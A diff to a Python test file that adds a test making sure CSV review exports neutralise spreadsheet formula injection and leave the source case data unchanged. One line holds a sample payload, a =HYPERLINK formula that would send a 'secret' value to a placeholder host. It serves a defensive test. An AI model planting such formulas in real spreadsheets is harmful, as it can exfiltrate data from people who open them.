@@ -7,7 +7,7 @@ import pytest
 from ntf_insight.analysis.hdbscan_clustering import cluster_hdbscan_cases
 from ntf_insight.analysis.mechanism_review import (
     ConfirmedMechanism, read_confirmed_mechanisms,
-    review_cluster_mechanisms, write_review_template,
+    review_cluster_mechanisms, safe_spreadsheet_cell, write_review_template,
 )
 from ntf_insight.domain.events import SupplierFinding
 
@@ -160,3 +160,20 @@ def test_only_explicit_confirmed_label_counts_and_no_raw_ssl_text_assumptions() 
     )
     confirmed = read_confirmed_mechanisms(stream, cases)
     assert len(confirmed) == 1 and confirmed[0].case_id == "A2"
+
+
+
+def test_review_export_escapes_csv_formula_payload_without_changing_source_case() -> None:
+    cases = sample()
+    payload = '=HYPERLINK("https://example.invalid/?secret=xyz", "Open")'
+    cases[0].qec_ssl_end_finding = payload
+    assert safe_spreadsheet_cell(payload).startswith("'=")
+    out = StringIO()
+    write_review_template(out, cases)
+    import csv
+    out.seek(0)
+    rows = list(csv.DictReader(out, delimiter=";"))
+    exported = next(row for row in rows if row["qec_case_id"] == "A0")
+    assert exported["qec_ssl_end_finding"] == "'" + payload
+    assert cases[0].qec_ssl_end_finding == payload
+    assert read_confirmed_mechanisms(StringIO(out.getvalue()), cases) == ()
